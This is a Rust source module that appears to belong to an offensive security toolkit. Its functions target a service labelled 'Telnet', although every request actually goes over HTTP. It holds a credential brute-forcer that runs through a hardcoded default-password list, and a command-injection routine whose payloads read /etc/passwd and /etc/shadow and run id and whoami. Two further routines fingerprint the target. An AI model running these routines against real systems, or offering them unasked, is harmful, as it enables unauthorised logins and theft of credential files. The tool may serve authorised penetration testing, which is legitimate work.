use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn brute(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Telnet Credential Brute Force", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let creds = [
        ("admin", "admin"), ("root", "root"), ("admin", "password"),
        ("root", "toor"), ("admin", ""), ("root", ""),
        ("user", "user"), ("guest", "guest"), ("admin", "1234"),
        ("root", "password"), ("admin", "admin123"), ("cisco", "cisco"),
    ];

    for (user, pass) in &creds {
        let body = serde_json::json!({"username": user, "password": pass});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && (text.contains("ok") || text.contains("success") || text.contains("welcome")) {
                    println!("  {} {:15}:{:15} — LOGIN SUCCESS", "[+]".green().bold(), user, if pass.is_empty() { "(empty)" } else { pass });
                }
            }
            Err(_) => {}
        }
    }

    Ok(())
}

pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Telnet Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let status = resp.status().as_u16();
    let headers = resp.headers().clone();
    let body = resp.text().await.unwrap_or_default();

    println!("  Status: {}", status);
    if let Some(server) = headers.get("server") {
        println!("  Server: {}", server.to_str().unwrap_or("unknown"));
    }
    if body.contains("Login") || body.contains("login") || body.contains("User") {
        println!("  {} Login prompt detected", "[+]".green().bold());
    }
    if body.contains("telnet") || body.contains("Telnet") {
        println!("  {} Telnet service confirmed", "[+]".green().bold());
    }

    Ok(())
}

pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Telnet Command Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        ("Command chain", "; cat /etc/passwd"),
        ("Pipe injection", "| id"),
        ("Newline inject", "\nwhoami\n"),
        ("Background exec", "& uname -a"),
        ("Subshell", "$(cat /etc/shadow)"),
    ];

    for (name, payload) in &payloads {
        let body = serde_json::json!({"cmd": payload});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && (text.contains("root") || text.contains("uid=") || text.contains("Linux")) {
                    println!("  {} {:20} — INJECTION SUCCESS", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn banner(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Telnet Banner Grab", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let status = resp.status().as_u16();
    let headers = resp.headers().clone();
    let body = resp.text().await.unwrap_or_default();

    println!("  HTTP Status: {}", status);
    for (key, value) in headers.iter() {
        println!("  {}: {}", key.as_str(), value.to_str().unwrap_or(""));
    }

    if !body.is_empty() {
        let preview: String = body.chars().take(200).collect();
        println!("\n  Body preview:\n  {}", preview);
    }

    if body.contains("Login") || body.contains("login") {
        println!("\n  {} Telnet login banner detected", "[+]".green().bold());
    }

    Ok(())
}
